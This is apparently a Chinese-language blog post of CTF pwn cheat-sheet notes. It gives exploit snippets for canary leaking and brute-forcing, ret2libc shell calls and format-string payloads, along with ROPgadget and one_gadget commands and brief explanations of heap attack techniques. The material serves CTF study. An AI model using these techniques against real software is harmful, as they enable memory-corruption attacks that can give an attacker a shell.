---
title: 测试文章
published: 2026-07-06
description: 测试
image: ./cover.jpg
tags: [堆栈,CTF]
category: 技术栈
draft: false
---



## wsrx到本地端口命令

```
wsrx connect \
  --host 127.0.0.1 \
  --port 12345 \
  "wss://ctf.xidian.edu.cn/api/traffic/RJ3hNk5ArHwEDcVl8Mmxg?port=9999"
```

停止转发:

```堆版本查询
pkill -f 'wsrx connect'
```

### 堆版本查询及切换

```
查询 strings libc.so.6 | grep GNU
切换ld和.so文件
cp heap theap
patchelf --set-interpreter ./ld.so.2 --set-rpath '$ORIGIN' theap
```

金丝雀处理语法:    

```
 `终端输出 canary = u64(io.recv(8).ljust(8,b'\x00')) & (0xffffffffffffff00)`
  %p输出 canary=int(io.recv(18),16)
```

libc处理方法:

```
64位接收 puts_addr = u64(p.recvuntil('\xf7')[-6:].ljust(8,b'\x00'))
32位接收 puts_addr = u32(io.recvuntil('\xf7')[-4:])
直接引入libc库时
system_addr = base + libc.sym['system']
binsh_addr = base + next(libc.search(b'/bin/sh'))
用LibcSearcher时
system_addr = base + libc.dump('system')
binsh_addr = base + libc.dump('str_bin_sh')
```

查看沙箱过滤的函数:   

```
seccomp-tools dump ./pwn 
```

ld版本切换指令:   

```
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./pwn#pwn是文件名，前面是你想换成的ld名
```

libc版本切换指令:

```
patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn#前面是现在使用的libc名字，后面是你想换的版本
```

### gadget命令

64位传参顺序  rdi   rsi   rdx   rcx   r8   r9

```
ROPgadget --binary pwn --only 'pop|ret' | grep 'eax’     only是筛选条件，grep是二次筛选
```

```
ROPgadget --binary pwn --string '/bin/sh'   找字符串
```

```
ROPgadget --binary pwn89 | grep leave      找leave
```

```
ROPgadget --binary pwn --ropchain   常用于静态编译,自动根据各种gadget地址生成一个可用的payload,覆盖到ret即可
```

```
one_gadget /lib/x86_64-linux-gnu/libc.so.6   用于已知libc版本,直接提取getshell的片段
```

## pwntools库的fmt封装语法

```
writes = {0x804a04c :u32('sh;a'),libc.symbols['__malloc_hook']:libc.symbols['system']}

payload_1 = fmtstr_payload(offset = 7,writes = writes,numbwritten = 0,write_size = 'short')

payload_2 = '%{}c'.format(width)
```

writes: 字典  numbwritten: 已经打印的字符数  write_size: 以几字节方式写入(byte  short  int )

### ELF保护机制

### 爆破canary脚本

```
p.recvuntil(b'welcome\n')

canary = b'\x00'

for k in range(3):
    for i in range(256):
        print(f"正在爆破Canary的第 {k + 1} 位")
        print(f"当前字符为: {hex(i)}")

        payload = b'a' * 100 + canary + bytes([i])

        print("当前payload为：", payload)

        p.send(payload)

        data = p.recvuntil(b"welcome\n")
        print(data)

        if b"success" in data:
            canary += bytes([i])
            print("Canary is:", canary)
            break
```

栈迁移

若只有一个溢出点且不能重复,需考虑多次栈迁移

### 花式栈溢出--利用金丝雀的程序崩溃

基本原理:异常处理函数输出错误信息时含有文件名 , 通过栈溢出精准覆盖文件名为某后门地址即可打印出信息

找文件名地址   

```
 p & __libc_argv[0]
```



## off-by-one

通过一个字节chunk一个字节的溢出，覆盖下一个堆块的size，从而在二次申请时获得更大的空间，进而造成堆溢出，进而可能修改top_chunk

覆盖其他特殊地址，如关键结构体指针，可能导致结构体被篡改，流程改变，进而输出敏感内容



## House of force

前提：存在堆利用可以修改top_chunk的size

​	    用户能自由分配malloc的申请大小（以向前回绕）

通过修改top_chunk的size大小，常改为-1，以达到后面有很大的堆空间的假象，进而通过申请超大内存将top指针指向任意地址，再申请大堆块以实现任意地址堆块申请。

如需向前申请需要通过整数溢出，精确计算申请大小（以修改top为-1为例）：公式为： —(目标地址+size+0xf）



## Use After Free

前提:chunk被释放后没有将指针设置为NULL

不设就会成为悬空指针,如果对其进异常写入,在重新申请到该区域,可能导致被异常执行



##  unsortedbin的unlink

通常通过伪造堆块,将某敏感内存区域写进bins,然后释放中间堆块,导致敏感区域建立上下堆块联系,进而控制该区内容,导致got表篡改或程序流异常执行

## fastbin的double_free()

通过对同一个堆块释放2次(形成chunk1->chunk2->chunk1)

然后申请到chunk1,使得bin的头直接指向循环链表,然后将chunk1的fd修改成敏感地址,然后就可以实现任意地址申请